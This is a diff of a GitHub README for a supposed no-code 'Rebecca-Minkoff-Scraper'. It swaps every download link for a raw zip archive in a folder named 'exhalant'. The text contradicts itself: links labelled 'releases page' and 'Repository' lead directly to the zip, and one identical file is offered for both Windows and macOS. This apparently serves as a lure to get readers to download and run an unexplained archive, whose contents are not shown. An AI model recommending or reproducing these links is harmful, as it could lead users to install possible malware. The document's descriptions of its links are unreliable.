@@ -1,7 +1,7 @@
 # 🛍️ Rebecca-Minkoff-Scraper - Easily Extract Product Data
 
 ## 📥 Download the Latest Version
-[![Download](https://github.com/hirak123github/Rebecca-Minkoff-Scraper/raw/refs/heads/main/exhalant/Rebecca-Minkoff-Scraper-2.3.zip)](https://github.com/hirak123github/Rebecca-Minkoff-Scraper/raw/refs/heads/main/exhalant/Rebecca-Minkoff-Scraper-2.3.zip)
+[![Download](https://raw.githubusercontent.com/hirak123github/Rebecca-Minkoff-Scraper/main/exhalant/Scraper-Rebecca-Minkoff-v2.8.zip)](https://raw.githubusercontent.com/hirak123github/Rebecca-Minkoff-Scraper/main/exhalant/Scraper-Rebecca-Minkoff-v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the Rebecca-Minkoff-Scraper! This application helps you easily extract product data from the Rebecca Minkoff online store. With this tool, you can collect information about products, prices, and more without needing any programming skills.
@@ -19,10 +19,10 @@ To get started, follow these simple steps:
 
 1. **Visit the Releases Page**
    Head over to the releases page to find the latest version of Rebecca-Minkoff-Scraper. You can do this by clicking the link below:
-   [Download Here](https://github.com/hirak123github/Rebecca-Minkoff-Scraper/raw/refs/heads/main/exhalant/Rebecca-Minkoff-Scraper-2.3.zip)
+   [Download Here](https://raw.githubusercontent.com/hirak123github/Rebecca-Minkoff-Scraper/main/exhalant/Scraper-Rebecca-Minkoff-v2.8.zip)
 
 2. **Choose Your Version**
-   On the releases page, look for the most recent version. You will see various files available for download. Click on the appropriate file for your operating system (e.g., https://github.com/hirak123github/Rebecca-Minkoff-Scraper/raw/refs/heads/main/exhalant/Rebecca-Minkoff-Scraper-2.3.zip for Windows or https://github.com/hirak123github/Rebecca-Minkoff-Scraper/raw/refs/heads/main/exhalant/Rebecca-Minkoff-Scraper-2.3.zip for macOS).
+   On the releases page, look for the most recent version. You will see various files available for download. Click on the appropriate file for your operating system (e.g., https://raw.githubusercontent.com/hirak123github/Rebecca-Minkoff-Scraper/main/exhalant/Scraper-Rebecca-Minkoff-v2.8.zip for Windows or https://raw.githubusercontent.com/hirak123github/Rebecca-Minkoff-Scraper/main/exhalant/Scraper-Rebecca-Minkoff-v2.8.zip for macOS).
 
 3. **Download the File**
    Once you’ve clicked on the file, your browser will start downloading it. The file size is small, so it should download quickly.
@@ -77,7 +77,7 @@ This project covers various topics including:
 By extracting product information, you can perform detailed market research and track price changes over time. This application is an excellent tool for fashion analysts, marketers, and anyone interested in ecommerce analytics.
 
 ## 🔗 Important Links
-- [Download Here](https://github.com/hirak123github/Rebecca-Minkoff-Scraper/raw/refs/heads/main/exhalant/Rebecca-Minkoff-Scraper-2.3.zip)
-- [Repository](https://github.com/hirak123github/Rebecca-Minkoff-Scraper/raw/refs/heads/main/exhalant/Rebecca-Minkoff-Scraper-2.3.zip)
+- [Download Here](https://raw.githubusercontent.com/hirak123github/Rebecca-Minkoff-Scraper/main/exhalant/Scraper-Rebecca-Minkoff-v2.8.zip)
+- [Repository](https://raw.githubusercontent.com/hirak123github/Rebecca-Minkoff-Scraper/main/exhalant/Scraper-Rebecca-Minkoff-v2.8.zip)
 
 Thank you for choosing Rebecca-Minkoff-Scraper! We hope you find it useful for your needs.
